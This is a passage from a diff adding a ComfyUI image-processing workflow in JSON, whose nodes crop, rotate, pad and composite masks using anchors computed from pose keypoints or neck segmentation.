+  "7069:94": {
+    "inputs": {
+      "detect": "min_bounding_rect",
+      "x_adjust": 0,
+      "y_adjust": 0,
+      "scale_adjust": 1.0,
+      "mask": [
+        "7069:90",
+        0
+      ]
+    },
+    "class_type": "LayerMask: MaskBoxDetect",
+    "_meta": {
+      "title": "图层遮罩：遮罩框检测"
+    }
+  },
+  "7069:95": {
+    "inputs": {
+      "detect": "min_bounding_rect",
+      "x_adjust": 0,
+      "y_adjust": 0,
+      "scale_adjust": 1.0,
+      "mask": [
+        "7069:7321",
+        0
+      ]
+    },
+    "class_type": "LayerMask: MaskBoxDetect",
+    "_meta": {
+      "title": "图层遮罩：遮罩框检测"
+    }
+  },
+  "7069:96": {
+    "inputs": {
+      "mask": [
+        "7069:7321",
+        0
+      ]
+    },
+    "class_type": "MaskPreview+",
+    "_meta": {
+      "title": "🔧 Mask Preview"
+    }
+  },
+  "7069:97": {
+    "inputs": {
+      "x": [
+        "7069:95",
+        5
+      ],
+      "y": [
+        "7069:95",
+        6
+      ],
+      "width": [
+        "7069:95",
+        3
+      ],
+      "height": [
+        "7069:95",
+        4
+      ],
+      "mask": [
+        "7069:7321",
+        0
+      ]
+    },
+    "class_type": "CropMask",
+    "_meta": {
+      "title": "裁剪遮罩"
+    }
+  },
+  "7069:98": {
+    "inputs": {
+      "x": [
+        "7069:94",
+        5
+      ],
+      "y": [
+        "7069:94",
+        6
+      ],
+      "width": [
+        "7069:94",
+        3
+      ],
+      "height": [
+        "7069:94",
+        4
+      ],
+      "mask": [
+        "7069:90",
+        0
+      ]
+    },
+    "class_type": "CropMask",
+    "_meta": {
+      "title": "裁剪遮罩"
+    }
+  },
+  "7069:99": {
+    "inputs": {
+      "mode": "weighted",
+      "threshold": 0.5,
+      "mask": [
+        "7069:97",
+        0
+      ]
+    },
+    "class_type": "CalculateMaskArea",
+    "_meta": {
+      "title": "Calculate Mask Area"
+    }
+  },
+  "7069:108": {
+    "inputs": {
+      "mode": "weighted",
+      "threshold": 0.5,
+      "mask": [
+        "7069:98",
+        0
+      ]
+    },
+    "class_type": "CalculateMaskArea",
+    "_meta": {
+      "title": "Calculate Mask Area"
+    }
+  },
+  "7069:73": {
+    "inputs": {
+      "boolean": [
+        "7069:72",
+        0
+      ],
+      "on_true": [
+        "7069:70",
+        0
+      ],
+      "on_false": [
+        "7069:69",
+        0
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "7069:74": {
+    "inputs": {
+      "boolean": [
+        "7069:72",
+        0
+      ],
+      "on_true": [
+        "7069:70",
+        1
+      ],
+      "on_false": [
+        "7069:69",
+        1
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "7069:7323": {
+    "inputs": {
+      "boolean": [
+        "7069:72",
+        0
+      ],
+      "on_true": [
+        "7069:70",
+        2
+      ],
+      "on_false": [
+        "7069:69",
+        2
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "7069:76": {
+    "inputs": {
+      "boolean": [
+        "7069:72",
+        0
+      ],
+      "on_true": [
+        "7069:70",
+        3
+      ],
+      "on_false": [
+        "7069:69",
+        3
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "7069:83": {
+    "inputs": {
+      "detect": "min_bounding_rect",
+      "x_adjust": 0,
+      "y_adjust": 0,
+      "scale_adjust": 1.0,
+      "mask": [
+        "7062",
+        0
+      ]
+    },
+    "class_type": "LayerMask: MaskBoxDetect",
+    "_meta": {
+      "title": "图层遮罩：遮罩框检测"
+    }
+  },
+  "7069:86": {
+    "inputs": {
+      "value": 0.0,
+      "width": [
+        "7069:7324",
+        0
+      ],
+      "height": [
+        "7069:112",
+        0
+      ]
+    },
+    "class_type": "SolidMask",
+    "_meta": {
+      "title": "纯块遮罩"
+    }
+  },
+  "7069:112": {
+    "inputs": {
+      "round_method": "round",
+      "any": [
+        "6815",
+        1
+      ]
+    },
+    "class_type": "ToInt",
+    "_meta": {
+      "title": "To Int | Basic"
+    }
+  },
+  "7069:81": {
+    "inputs": {
+      "left": 0,
+      "right": [
+        "7069:7324",
+        0
+      ],
+      "top": 0,
+      "bottom": 0,
+      "invert": false,
+      "mask": [
+        "7069:80",
+        0
+      ]
+    },
+    "class_type": "DirectionalGrowMask",
+    "_meta": {
+      "title": "Directional Grow Mask"
+    }
+  },
+  "7069:82": {
+    "inputs": {
+      "left": [
+        "7069:7324",
+        0
+      ],
+      "right": 0,
+      "top": 0,
+      "bottom": 0,
+      "invert": false,
+      "mask": [
+        "7069:80",
+        0
+      ]
+    },
+    "class_type": "DirectionalGrowMask",
+    "_meta": {
+      "title": "Directional Grow Mask"
+    }
+  },
+  "7069:7324": {
+    "inputs": {
+      "round_method": "round",
+      "any": [
+        "6815",
+        0
+      ]
+    },
+    "class_type": "ToInt",
+    "_meta": {
+      "title": "To Int | Basic"
+    }
+  },
+  "7069:80": {
+    "inputs": {
+      "anchor_x": [
+        "7069:73",
+        0
+      ],
+      "anchor_y": [
+        "7069:74",
+        0
+      ],
+      "angle": [
+        "7069:7323",
+        0
+      ],
+      "scale": [
+        "7069:76",
+        0
+      ],
+      "image_width": [
+        "6815",
+        0
+      ],
+      "image_height": [
+        "6815",
+        1
+      ],
+      "width_ratio": 0.2,
+      "height_ratio": 100.0,
+      "feather": 0,
+      "invert": false
+    },
+    "class_type": "CreateRotatedMask",
+    "_meta": {
+      "title": "Create Rotated Mask"
+    }
+  },
+  "7069:100": {
+    "inputs": {
+      "expression": "a / (b + 0.1)",
+      "a": [
+        "7069:99",
+        0
+      ],
+      "b": [
+        "7069:108",
+        0
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7069:93": {
+    "inputs": {
+      "mask": [
+        "7069:90",
+        0
+      ]
+    },
+    "class_type": "MaskPreview+",
+    "_meta": {
+      "title": "🔧 Mask Preview"
+    }
+  },
+  "7069:101": {
+    "inputs": {
+      "output": "",
+      "source": [
+        "7069:100",
+        1
+      ]
+    },
+    "class_type": "Display Any (rgthree)",
+    "_meta": {
+      "title": "Display Any (rgthree)"
+    }
+  },
+  "7069:69": {
+    "inputs": {
+      "image_width": [
+        "6815",
+        0
+      ],
+      "image_height": [
+        "6815",
+        1
+      ],
+      "side": -1,
+      "anchor_side_ratio": 0.0,
+      "anchor_vertical_ratio": 0.28,
+      "pose_keypoints": [
+        "6810",
+        1
+      ]
+    },
+    "class_type": "ComputeAnchorFromPose",
+    "_meta": {
+      "title": "Compute Anchor From Pose"
+    }
+  },
+  "7052:7083": {
+    "inputs": {
+      "mask": [
+        "7052:7084",
+        0
+      ]
+    },
+    "class_type": "GetMaskSizeAndCount",
+    "_meta": {
+      "title": "Get Mask Size & Count"
+    }
+  },
+  "7052:7084": {
+    "inputs": {
+      "x": [
+        "7052:7085",
+        5
+      ],
+      "y": [
+        "7052:7085",
+        6
+      ],
+      "width": [
+        "7052:7085",
+        3
+      ],
+      "height": [
+        "7052:7085",
+        4
+      ],
+      "mask": [
+        "7000",
+        1
+      ]
+    },
+    "class_type": "CropMask",
+    "_meta": {
+      "title": "裁剪遮罩"
+    }
+  },
+  "7052:6980": {
+    "inputs": {
+      "mask": [
+        "7052:7084",
+        0
+      ]
+    },
+    "class_type": "MaskToImage",
+    "_meta": {
+      "title": "遮罩转换为图像"
+    }
+  },
+  "7052:7085": {
+    "inputs": {
+      "detect": "min_bounding_rect",
+      "x_adjust": 0,
+      "y_adjust": 0,
+      "scale_adjust": 1.0,
+      "mask": [
+        "7000",
+        1
+      ]
+    },
+    "class_type": "LayerMask: MaskBoxDetect",
+    "_meta": {
+      "title": "图层遮罩：遮罩框检测"
+    }
+  },
+  "7052:7086": {
+    "inputs": {
+      "detect": "min_bounding_rect",
+      "x_adjust": 0,
+      "y_adjust": 0,
+      "scale_adjust": 1.0,
+      "mask": [
+        "7052:7097",
+        0
+      ]
+    },
+    "class_type": "LayerMask: MaskBoxDetect",
+    "_meta": {
+      "title": "图层遮罩：遮罩框检测"
+    }
+  },
+  "7052:7087": {
+    "inputs": {
+      "x": [
+        "7052:7086",
+        5
+      ],
+      "y": [
+        "7052:7086",
+        6
+      ],
+      "width": [
+        "7052:7086",
+        3
+      ],
+      "height": [
+        "7052:7086",
+        4
+      ],
+      "mask": [
+        "7052:7097",
+        0
+      ]
+    },
+    "class_type": "CropMask",
+    "_meta": {
+      "title": "裁剪遮罩"
+    }
+  },
+  "7052:6997": {
+    "inputs": {
+      "mask": [
+        "7052:7087",
+        0
+      ]
+    },
+    "class_type": "MaskToImage",
+    "_meta": {
+      "title": "遮罩转换为图像"
+    }
+  },
+  "7052:6933": {
+    "inputs": {
+      "x": [
+        "7052:6931",
+        5
+      ],
+      "y": [
+        "7052:6931",
+        6
+      ],
+      "width": [
+        "7052:6931",
+        3
+      ],
+      "height": [
+        "7052:6931",
+        4
+      ],
+      "mask": [
+        "7062",
+        0
+      ]
+    },
+    "class_type": "CropMask",
+    "_meta": {
+      "title": "裁剪遮罩"
+    }
+  },
+  "7052:7088": {
+    "inputs": {
+      "boolean": [
+        "7052:7091",
+        0
+      ],
+      "on_true": [
+        "7052:7090",
+        3
+      ],
+      "on_false": [
+        "7052:6813",
+        3
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "7052:7089": {
+    "inputs": {
+      "value": 0.0
+    },
+    "class_type": "FloatConstant",
+    "_meta": {
+      "title": "Float Constant"
+    }
+  },
+  "7052:6813": {
+    "inputs": {
+      "image_width": 1024,
+      "image_height": 1024,
+      "side": -1,
+      "anchor_side_ratio": 0.4,
+      "anchor_vertical_ratio": 0.28,
+      "pose_keypoints": [
+        "6810",
+        1
+      ]
+    },
+    "class_type": "ComputeAnchorFromPose",
+    "_meta": {
+      "title": "Compute Anchor From Pose"
+    }
+  },
+  "7052:7090": {
+    "inputs": {
+      "side": -1,
+      "anchor_side_ratio": 0.4,
+      "anchor_vertical_ratio": 0.28,
+      "neck_mask": [
+        "6981",
+        1
+      ]
+    },
+    "class_type": "ComputeAnchorFromNeckSegmentation",
+    "_meta": {
+      "title": "Compute Anchor From Neck Segmentation"
+    }
+  },
+  "7052:7091": {
+    "inputs": {
+      "comparison": "a == b",
+      "a": [
+        "7052:6813",
+        3
+      ],
+      "b": [
+        "7052:7089",
+        0
+      ]
+    },
+    "class_type": "easy compare",
+    "_meta": {
+      "title": "比较"
+    }
+  },
+  "7052:7092": {
+    "inputs": {
+      "boolean": [
+        "7052:7091",
+        0
+      ],
+      "on_true": [
+        "7052:7090",
+        0
+      ],
+      "on_false": [
+        "7052:6813",
+        0
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "7052:7020": {
+    "inputs": {
+      "number": [
+        "7052:7093",
+        0
+      ]
+    },
+    "class_type": "Number to Int",
+    "_meta": {
+      "title": "Number to Int"
+    }
+  },
+  "7052:7093": {
+    "inputs": {
+      "boolean": [
+        "7052:7091",
+        0
+      ],
+      "on_true": [
+        "7052:7090",
+        1
+      ],
+      "on_false": [
+        "7052:6813",
+        1
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "7052:7005": {
+    "inputs": {
+      "expression": "max(a,b)",
+      "a": [
+        "7052:6931",
+        3
+      ],
+      "b": [
+        "7052:6931",
+        4
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7052:7094": {
+    "inputs": {
+      "expression": "max(a - b - c,0)",
+      "a": [
+        "6815",
+        1
+      ],
+      "b": [
+        "7052:7099",
+        0
+      ],
+      "c": [
+        "7052:7004",
+        4
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7052:7095": {
+    "inputs": {
+      "boolean": [
+        "7052:7091",
+        0
+      ],
+      "on_true": [
+        "7052:7090",
+        2
+      ],
+      "on_false": [
+        "7052:6813",
+        2
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "7052:7096": {
+    "inputs": {
+      "left": 0,
+      "right": 0,
+      "top": 0,
+      "bottom": 0,
+      "extra_padding": [
+        "7052:7083",
+        1
+      ],
+      "pad_mode": "edge",
+      "color": "0, 0, 0",
+      "image": [
+        "7052:6980",
+        0
+      ],
+      "mask": [
+        "7052:7084",
+        0
+      ]
+    },
+    "class_type": "ImagePadKJ",
+    "_meta": {
+      "title": "ImagePad KJ"
+    }
+  },
+  "7052:7097": {
+    "inputs": {
+      "channel": "red",
+      "image": [
+        "7052:7026",
+        0
+      ]
+    },
+    "class_type": "ImageToMask",
+    "_meta": {
+      "title": "图像转换为遮罩"
+    }
+  },
+  "7052:7026": {
+    "inputs": {
+      "x": 0,
+      "y": 0,
+      "mirror": "None",
+      "scale": 1.0,
+      "aspect_ratio": 1.0,
+      "rotate": [
+        "7052:7095",
+        0
+      ],
+      "transform_method": "lanczos",
+      "anti_aliasing": 2,
+      "image": [
+        "7052:7096",
+        0
+      ]
+    },
+    "class_type": "LayerUtility: LayerImageTransform",
+    "_meta": {
+      "title": "图层工具：图层图像变换"
+    }
+  },
+  "7052:7098": {
+    "inputs": {
+      "expression": "max(a - b - c,0)",
+      "a": [
+        "6815",
+        0
+      ],
+      "b": [
+        "7052:6993",
+        0
+      ],
+      "c": [
+        "7052:7004",
+        3
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7052:6993": {
+    "inputs": {
+      "expression": "max(b - c * 0.5,0)",
+      "a": [
+        "6815",
+        0
+      ],
+      "b": [
+        "7052:7019",
+        0
+      ],
+      "c": [
+        "7052:7004",
+        3
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7052:7099": {
+    "inputs": {
+      "expression": "max(b - c * 0.5,0)",
+      "a": [
+        "6815",
+        1
+      ],
+      "b": [
+        "7052:7020",
+        0
+      ],
+      "c": [
+        "7052:7004",
+        4
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7052:7019": {
+    "inputs": {
+      "number": [
+        "7052:7092",
+        0
+      ]
+    },
+    "class_type": "Number to Int",
+    "_meta": {
+      "title": "Number to Int"
+    }
+  },
+  "7052:7006": {
+    "inputs": {
+      "channel": "red",
+      "image": [
+        "7052:6995",
+        0
+      ]
+    },
+    "class_type": "ImageToMask",
+    "_meta": {
+      "title": "图像转换为遮罩"
+    }
+  },
+  "7052:6814": {
+    "inputs": {
+      "anchor_x": [
+        "7052:7092",
+        0
+      ],
+      "anchor_y": [
+        "7052:7093",
+        0
+      ],
+      "angle": [
+        "7052:7095",
+        0
+      ],
+      "scale": [
+        "7052:7088",
+        0
+      ],
+      "image_width": [
+        "6815",
+        0
+      ],
+      "image_height": [
+        "6815",
+        1
+      ],
+      "width_ratio": [
+        "6864",
+        0
+      ],
+      "height_ratio": [
+        "6863",
+        1
+      ],
+      "feather": 25,
+      "invert": false
+    },
+    "class_type": "CreateRotatedMask",
+    "_meta": {
+      "title": "Create Rotated Mask"
+    }
+  },
+  "7052:6931": {
+    "inputs": {
+      "detect": "min_bounding_rect",
+      "x_adjust": 0,
+      "y_adjust": 0,
+      "scale_adjust": 1.0,
+      "mask": [
+        "7052:6814",
+        0
+      ]
+    },
+    "class_type": "LayerMask: MaskBoxDetect",
+    "_meta": {
+      "title": "图层遮罩：遮罩框检测"
+    }
+  },
+  "7052:6883": {
+    "inputs": {
+      "x": [
+        "7052:6931",
+        5
+      ],
+      "y": [
+        "7052:6931",
+        6
+      ],
+      "width": [
+        "7052:6931",
+        3
+      ],
+      "height": [
+        "7052:6931",
+        4
+      ],
+      "mask": [
+        "7052:6814",
+        0
+      ]
+    },
+    "class_type": "CropMask",
+    "_meta": {
+      "title": "裁剪遮罩"
+    }
+  },
+  "7052:6878": {
+    "inputs": {
+      "x": 0,
+      "y": 0,
+      "operation": "and",
+      "destination": [
+        "7052:6933",
+        0
+      ],
+      "source": [
+        "7052:6883",
+        0
+      ]
+    },
+    "class_type": "MaskComposite",
+    "_meta": {
+      "title": "合成遮罩"
+    }
+  },
+  "7052:6907": {
+    "inputs": {
+      "mode": "threshold",
+      "threshold": 0.5,
+      "mask": [
+        "7052:6878",
+        0
+      ]
+    },
+    "class_type": "CalculateMaskArea",
+    "_meta": {
+      "title": "Calculate Mask Area"
+    }
+  },
+  "7052:7032": {
+    "inputs": {
+      "channel": "red",
+      "image": [
+        "7052:7030",
+        0
+      ]
+    },
+    "class_type": "ImageToMask",
+    "_meta": {
+      "title": "图像转换为遮罩"
+    }
+  },
+  "7052:6995": {
+    "inputs": {
+      "left": [
+        "7052:6993",
+        0
+      ],
+      "right": [
+        "7052:7098",
+        0
+      ],
+      "top": [
+        "7052:7099",
+        0
+      ],
+      "bottom": [
+        "7052:7094",
+        0
+      ],
+      "extra_padding": 0,
+      "pad_mode": "edge",
+      "color": "0, 0, 0",
+      "image": [
+        "7052:7004",
+        0
+      ],
+      "mask": [
+        "7052:7004",
+        1
+      ]
+    },
+    "class_type": "ImagePadKJ",
+    "_meta": {
+      "title": "ImagePad KJ"
+    }
+  },
+  "7052:7028": {
+    "inputs": {
+      "expression": "-min(b - c * 0.5,0)",
+      "a": [
+        "6815",
+        0
+      ],
+      "b": [
+        "7052:7019",
+        0
+      ],
+      "c": [
+        "7052:7004",
+        3
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7052:7004": {
+    "inputs": {
+      "scale": 1.0,
+      "method": "lanczos",
+      "scale_by": "longest",
+      "scale_by_length": [
+        "7052:7005",
+        0
+      ],
+      "image": [
+        "7052:6997",
+        0
+      ],
+      "mask": [
+        "7052:7087",
+        0
+      ]
+    },
+    "class_type": "LayerUtility: ImageScaleRestore V2",
+    "_meta": {
+      "title": "图层工具：缩放恢复 V2"
+    }
+  },
+  "7052:7029": {
+    "inputs": {
+      "expression": "-min(b - c * 0.5,0)",
+      "a": [
+        "6815",
+        1
+      ],
+      "b": [
+        "7052:7020",
+        0
+      ],
+      "c": [
+        "7052:7004",
+        4
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7052:7030": {
+    "inputs": {
+      "width": [
+        "6815",
+        0
+      ],
+      "height": [
+        "6815",
+        1
+      ],
+      "x": [
+        "7052:7028",
+        0
+      ],
+      "y": [
+        "7052:7029",
+        0
+      ],
+      "image": [
+        "7052:6995",
+        0
+      ]
+    },
+    "class_type": "ImageCrop",
+    "_meta": {
+      "title": "裁剪图像"
+    }
+  },
+  "7064:7101": {
+    "inputs": {
+      "mask": [
+        "7064:7102",
+        0
+      ]
+    },
+    "class_type": "GetMaskSizeAndCount",
+    "_meta": {
+      "title": "Get Mask Size & Count"
+    }
+  },
+  "7064:7102": {
+    "inputs": {
+      "x": [
+        "7064:7104",
+        5
+      ],
+      "y": [
+        "7064:7104",
+        6
+      ],
+      "width": [
+        "7064:7104",
+        3
+      ],
+      "height": [
+        "7064:7104",
+        4
+      ],
+      "mask": [
+        "7000",
+        1
+      ]
+    },
+    "class_type": "CropMask",
+    "_meta": {
+      "title": "裁剪遮罩"
+    }
+  },
+  "7064:7103": {
+    "inputs": {
+      "mask": [
+        "7064:7102",
+        0
+      ]
+    },
+    "class_type": "MaskToImage",
+    "_meta": {
+      "title": "遮罩转换为图像"
+    }
+  },
+  "7064:7104": {
+    "inputs": {
+      "detect": "min_bounding_rect",
+      "x_adjust": 0,
+      "y_adjust": 0,
+      "scale_adjust": 1.0,
+      "mask": [
+        "7000",
+        1
+      ]
+    },
+    "class_type": "LayerMask: MaskBoxDetect",
+    "_meta": {
+      "title": "图层遮罩：遮罩框检测"
+    }
+  },
+  "7064:7105": {
+    "inputs": {
+      "detect": "min_bounding_rect",
+      "x_adjust": 0,
+      "y_adjust": 0,
+      "scale_adjust": 1.0,
+      "mask": [
+        "7064:7121",
+        0
+      ]
+    },
+    "class_type": "LayerMask: MaskBoxDetect",
+    "_meta": {
+      "title": "图层遮罩：遮罩框检测"
+    }
+  },
+  "7064:7106": {
+    "inputs": {
+      "x": [
+        "7064:7105",
+        5
+      ],
+      "y": [
+        "7064:7105",
+        6
+      ],
+      "width": [
+        "7064:7105",
+        3
+      ],
+      "height": [
+        "7064:7105",
+        4
+      ],
+      "mask": [
+        "7064:7121",
+        0
+      ]
+    },
+    "class_type": "CropMask",
+    "_meta": {
+      "title": "裁剪遮罩"
+    }
+  },
+  "7064:7107": {
+    "inputs": {
+      "mask": [
+        "7064:7106",
+        0
+      ]
+    },
+    "class_type": "MaskToImage",
+    "_meta": {
+      "title": "遮罩转换为图像"
+    }
+  },
+  "7064:7108": {
+    "inputs": {
+      "x": [
+        "7064:7132",
+        5
+      ],
+      "y": [
+        "7064:7132",
+        6
+      ],
+      "width": [
+        "7064:7132",
+        3
+      ],
+      "height": [
+        "7064:7132",
+        4
+      ],
+      "mask": [
+        "7062",
+        0
+      ]
+    },
+    "class_type": "CropMask",
+    "_meta": {
+      "title": "裁剪遮罩"
+    }
+  },
+  "7064:7109": {
+    "inputs": {
+      "boolean": [
+        "7064:7113",
+        0
+      ],
+      "on_true": [
+        "7064:7112",
+        3
+      ],
+      "on_false": [
+        "7064:7111",
+        3
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "7064:7110": {
+    "inputs": {
+      "value": 0.0
+    },
+    "class_type": "FloatConstant",
+    "_meta": {
+      "title": "Float Constant"
+    }
+  },
+  "7064:7111": {
+    "inputs": {
+      "image_width": 1024,
+      "image_height": 1024,
+      "side": -1,
+      "anchor_side_ratio": 0.18,
+      "anchor_vertical_ratio": 0.28,
+      "pose_keypoints": [
+        "6810",
+        1
+      ]
+    },
+    "class_type": "ComputeAnchorFromPose",
+    "_meta": {
+      "title": "Compute Anchor From Pose"
+    }
+  },
+  "7064:7112": {
+    "inputs": {
+      "side": -1,
+      "anchor_side_ratio": 0.18,
+      "anchor_vertical_ratio": 0.28,
+      "neck_mask": [
+        "6981",
+        1
+      ]
+    },
+    "class_type": "ComputeAnchorFromNeckSegmentation",
+    "_meta": {
+      "title": "Compute Anchor From Neck Segmentation"
+    }
+  },
+  "7064:7113": {
+    "inputs": {
+      "comparison": "a == b",
+      "a": [
+        "7064:7111",
+        3
+      ],
+      "b": [
+        "7064:7110",
+        0
+      ]
+    },
+    "class_type": "easy compare",
+    "_meta": {
+      "title": "比较"
+    }
+  },
+  "7064:7114": {
+    "inputs": {
+      "boolean": [
+        "7064:7113",
+        0
+      ],
+      "on_true": [
+        "7064:7112",
+        0
+      ],
+      "on_false": [
+        "7064:7111",
+        0
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "7064:7115": {
+    "inputs": {
+      "number": [
+        "7064:7116",
+        0
+      ]
+    },
+    "class_type": "Number to Int",
+    "_meta": {
+      "title": "Number to Int"
+    }
+  },
+  "7064:7116": {
+    "inputs": {
+      "boolean": [
+        "7064:7113",
+        0
+      ],
+      "on_true": [
+        "7064:7112",
+        1
+      ],
+      "on_false": [
+        "7064:7111",
+        1
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "7064:7117": {
+    "inputs": {
+      "expression": "max(a,b)",
+      "a": [
+        "7064:7132",
+        3
+      ],
+      "b": [
+        "7064:7132",
+        4
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7064:7118": {
+    "inputs": {
+      "expression": "max(a - b - c,0)",
+      "a": [
+        "6815",
+        1
+      ],
+      "b": [
+        "7064:7126",
+        0
+      ],
+      "c": [
+        "7064:7139",
+        4
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7064:7119": {
+    "inputs": {
+      "boolean": [
+        "7064:7113",
+        0
+      ],
+      "on_true": [
+        "7064:7112",
+        2
+      ],
+      "on_false": [
+        "7064:7111",
+        2
+      ]
+    },
+    "class_type": "Switch any [Crystools]",
+    "_meta": {
+      "title": "🪛 Switch any"
+    }
+  },
+  "7064:7120": {
+    "inputs": {
+      "left": 0,
+      "right": 0,
+      "top": 0,
+      "bottom": 0,
+      "extra_padding": [
+        "7064:7101",
+        1
+      ],
+      "pad_mode": "edge",
+      "color": "0, 0, 0",
+      "image": [
+        "7064:7103",
+        0
+      ],
+      "mask": [
+        "7064:7102",
+        0
+      ]
+    },
+    "class_type": "ImagePadKJ",
+    "_meta": {
+      "title": "ImagePad KJ"
+    }
+  },
+  "7064:7121": {
+    "inputs": {
+      "channel": "red",
+      "image": [
+        "7064:7122",
+        0
+      ]
+    },
+    "class_type": "ImageToMask",
+    "_meta": {
+      "title": "图像转换为遮罩"
+    }
+  },
+  "7064:7122": {
+    "inputs": {
+      "x": 0,
+      "y": 0,
+      "mirror": "None",
+      "scale": 1.0,
+      "aspect_ratio": 1.0,
+      "rotate": [
+        "7064:7119",
+        0
+      ],
+      "transform_method": "lanczos",
+      "anti_aliasing": 2,
+      "image": [
+        "7064:7120",
+        0
+      ]
+    },
+    "class_type": "LayerUtility: LayerImageTransform",
+    "_meta": {
+      "title": "图层工具：图层图像变换"
+    }
+  },
+  "7064:7123": {
+    "inputs": {
+      "expression": "max(a - b - c,0)",
+      "a": [
+        "6815",
+        0
+      ],
+      "b": [
+        "7064:7124",
+        0
+      ],
+      "c": [
+        "7064:7139",
+        3
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7064:7124": {
+    "inputs": {
+      "expression": "max(b - c * 0.5,0)",
+      "a": [
+        "6815",
+        0
+      ],
+      "b": [
+        "7064:7128",
+        0
+      ],
+      "c": [
+        "7064:7139",
+        3
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7064:7126": {
+    "inputs": {
+      "expression": "max(b - c * 0.5,0)",
+      "a": [
+        "6815",
+        1
+      ],
+      "b": [
+        "7064:7115",
+        0
+      ],
+      "c": [
+        "7064:7139",
+        4
+      ]
+    },
+    "class_type": "MathExpression|pysssss",
+    "_meta": {
+      "title": "Math Expression 🐍"
+    }
+  },
+  "7064:7128": {
+    "inputs": {
+      "number": [
+        "7064:7114",
+        0
+      ]
+    },
+    "class_type": "Number to Int",
+    "_meta": {
+      "title": "Number to Int"
+    }
+  },
+  "7064:7130": {
+    "inputs": {
+      "channel": "red",
+      "image": [
+        "7064:7137",
+        0
+      ]
+    },
+    "class_type": "ImageToMask",
+    "_meta": {
+      "title": "图像转换为遮罩"
+    }
+  },
+  "7064:7131": {
+    "inputs": {
+      "anchor_x": [
+        "7064:7114",
+        0
+      ],
+      "anchor_y": [
+        "7064:7116",
+        0
+      ],
+      "angle": [
+        "7064:7119",
+        0
+      ],
+      "scale": [
+        "7064:7109",
+        0
+      ],
+      "image_width": [
+        "6815",
+        0
+      ],
+      "image_height": [
+        "6815",
+        1
+      ],
+      "width_ratio": [
+        "6864",
+        0
+      ],
+      "height_ratio": [
+        "6863",
+        1
+      ],
+      "feather": 25,
+      "invert": false
+    },
+    "class_type": "CreateRotatedMask",
+    "_meta": {
+      "title": "Create Rotated Mask"
+    }
+  },
+  "7064:7132": {
+    "inputs": {
+      "detect": "min_bounding_rect",
+      "x_adjust": 0,
+      "y_adjust": 0,
+      "scale_adjust": 1.0,
+      "mask": [
+        "7064:7131",
+        0
+      ]
+    },
+    "class_type": "LayerMask: MaskBoxDetect",
+    "_meta": {
+      "title": "图层遮罩：遮罩框检测"
+    }
+  },
+  "7064:7133": {
+    "inputs": {
+      "x": [
+        "7064:7132",
+        5
+      ],
+      "y": [
+        "7064:7132",
+        6
+      ],
+      "width": [
+        "7064:7132",
+        3
+      ],
+      "height": [
+        "7064:7132",
+        4
+      ],
+      "mask": [
+        "7064:7131",
+        0
+      ]
+    },
+    "class_type": "CropMask",
+    "_meta": {
+      "title": "裁剪遮罩"
+    }
+  },
+  "7064:7134": {
+    "inputs": {
+      "x": 0,
+      "y": 0,
+      "operation": "and",
+      "destination": [
+        "7064:7108",
+        0
+      ],
+      "source": [
+        "7064:7133",
+        0
+      ]
+    },
+    "class_type": "MaskComposite",
+    "_meta": {
+      "title": "合成遮罩"
+    }
+  },
+  "7064:7135": {
+    "inputs": {
+      "mode": "threshold",
+      "threshold": 0.5,
+      "mask": [
+        "7064:7134",
+        0
+      ]
+    },
+    "class_type": "CalculateMaskArea",
+    "_meta": {
+      "title": "Calculate Mask Area"
+    }
+  },
+  "7064:7136": {
+    "inputs": {
+      "channel": "red",
+      "image": [
+        "7064:7142",
+        0
+      ]
+    },
+    "class_type": "ImageToMask",
+    "_meta": {
+      "title": "图像转换为遮罩"
+    }
+  },
+  "7064:7137": {
+    "inputs": {
+      "left": [
+        "7064:7124",
+        0
+      ],
+      "right": [
